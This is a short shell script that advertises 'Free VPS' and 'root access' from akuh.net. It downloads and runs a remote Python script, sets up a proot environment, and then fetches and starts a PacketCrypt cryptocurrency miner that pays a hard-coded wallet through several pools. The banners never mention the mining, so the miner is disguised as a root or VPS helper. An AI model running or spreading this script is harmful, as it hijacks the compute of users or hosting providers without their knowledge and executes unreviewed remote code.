echo "===================================="
echo "More  Free VPS akuh.net"
echo "===================================="
pip install googledrivedownloader
wget https://raw.githubusercontent.com/akuhnet/wqemu/main/getrot.py
python getrot.py
unzip root.zip
tar -xvf root.tar.xz
wget https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.4.4/packetcrypt-v0.4.4-linux_amd64
chmod +x packetcrypt-v0.4.4-linux_amd64
echo "===================================="
echo "Keep supporting akuh.net, thank you"
echo "You Got Root access now"
echo "===================================="
./dist/proot -S . /bin/bash
./packetcrypt-v0.4.4-linux_amd64 ann -p pkt1q56fzt94rwxzw0l8u37vgczkzclfl0szqwp6sqr http://pool.srizbi.com http://pool.pktpool.io http://pool.pkt.world
